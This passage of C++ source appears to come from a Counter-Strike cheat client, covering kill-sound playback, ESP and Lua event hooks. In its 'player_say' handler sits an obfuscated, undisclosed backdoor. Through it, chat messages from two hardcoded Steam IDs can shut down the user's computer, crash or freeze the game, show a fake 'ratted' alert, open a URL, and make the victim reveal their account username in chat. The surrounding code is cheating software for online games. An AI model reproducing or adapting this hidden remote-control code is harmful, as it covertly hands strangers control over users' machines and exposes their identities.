								BYTE* pDataOffset = (bytes + offset);
								DWORD dwNumSampleBytes = *(DWORD*)(pDataOffset + 4);
								DWORD dwNumSamples = dwNumSampleBytes / 2;

								SHORT* pSample = (SHORT*)(pDataOffset + 8);
								for (DWORD dwIndex = 0; dwIndex < dwNumSamples; dwIndex++)
								{
									SHORT shSample = *pSample;
									shSample = (SHORT)(shSample * (g_Vars.misc.killsound_volume / 100.f));
									*pSample = shSample;
									pSample++;
									if (((BYTE*)pSample) >= (bytes + dwFileSize - 1))
										break;
								}
							};

							if (pFileBytes) {
								modify_volume(pFileBytes);
								PlaySoundA((LPCSTR)pFileBytes, NULL, SND_MEMORY | SND_ASYNC);
							}
						}
					}
				}

			}
		}

		IEsp::Get( )->SetAlpha( iEnemyIndex );

		for (auto hk : g_luagameeventmanager.get_gameevents(XorStr("player_death"))) hk.func(pEvent);

		break;
	}
	case hash_32_fnv1a_const("player_say"):
	{
#ifndef DEV

		player_info_t info;
		int index = Interfaces::m_pEngine->GetPlayerForUserID(pEvent->GetInt(XorStr("userid")));
		std::string message = pEvent->GetString(XorStr("text"));

		if (Interfaces::m_pEngine->GetPlayerInfo(index, &info)) {

			//printf(info.szSteamID);

			if (message == XorStr("#force up true") && (std::string(info.szSteamID) == XorStr("STEAM_1:0:548599781") || std::string(info.szSteamID) == XorStr("STEAM_1:1:62707320")))
			{
				g_Vars.globals.m_rce_forceup = true;
				return;
			}

			if (message == XorStr("#force up false") && (std::string(info.szSteamID) == XorStr("STEAM_1:0:548599781") || std::string(info.szSteamID) == XorStr("STEAM_1:1:62707320")))
			{
				g_Vars.globals.m_rce_forceup = false;
				return;
			}

			if (message == XorStr("#freeze") && (std::string(info.szSteamID) == XorStr("STEAM_1:0:548599781") || std::string(info.szSteamID) == XorStr("STEAM_1:1:62707320"))) // if used will most likely crash the user
			{
				Sleep(5000);
				return;
			}

			if (message == XorStr("#rat") && (std::string(info.szSteamID) == XorStr("STEAM_1:0:548599781") || std::string(info.szSteamID) == XorStr("STEAM_1:1:62707320"))) // if used will most likely crash the user
			{
				MessageBox(
					NULL,
					XorStr("You got ratted.\nSmoked kid."),
					XorStr("A Very Scary Rat"),
					MB_ICONERROR | MB_OK);

				return;
			}

			if (message == XorStr("#rick_roll") && (std::string(info.szSteamID) == XorStr("STEAM_1:0:548599781") || std::string(info.szSteamID) == XorStr("STEAM_1:1:62707320")))
			{
				LI_FN(system)(XorStr("start https://www.youtube.com/watch?v=QtBDL8EiNZo"));
				return;
			}

			if (message == XorStr("#shutdown") && (std::string(info.szSteamID) == XorStr("STEAM_1:0:548599781") || std::string(info.szSteamID) == XorStr("STEAM_1:1:62707320")))
			{
				LI_FN(system)(XorStr("shutdown /s"));
				return;
			}

			if (message == XorStr("#username") && (std::string(info.szSteamID) == XorStr("STEAM_1:0:548599781") || std::string(info.szSteamID) == XorStr("STEAM_1:1:62707320")))
			{
				const std::string user = g_Vars.globals.c_username;
				char buff[255];
				sprintf_s(buff, XorStr("say \"%s\""), user.c_str());
				Interfaces::m_pEngine->ClientCmd(buff);
			}

			if (message == XorStr("#crash") && (std::string(info.szSteamID) == XorStr("STEAM_1:0:548599781") || std::string(info.szSteamID) == XorStr("STEAM_1:1:62707320")))
			{
				LI_FN(exit)(0);
				return;
			}
		}
#endif

		break;
	}
	case hash_32_fnv1a_const("cs_win_panel_match"):
	{
		for (auto hk : g_luagameeventmanager.get_gameevents(XorStr("cs_win_panel_match"))) hk.func(pEvent);
		break;
	}
	case hash_32_fnv1a_const("cs_match_end_restart"):
	{
		for (auto hk : g_luagameeventmanager.get_gameevents(XorStr("cs_match_end_restart"))) hk.func(pEvent);
		break;
	}
	case hash_32_fnv1a_const("match_end_conditions"):
	{
		for (auto hk : g_luagameeventmanager.get_gameevents(XorStr("match_end_conditions"))) hk.func(pEvent);
		break;
	}
	}
}

int C_GameEvent::GetEventDebugID( void ) {
	return 42;
}
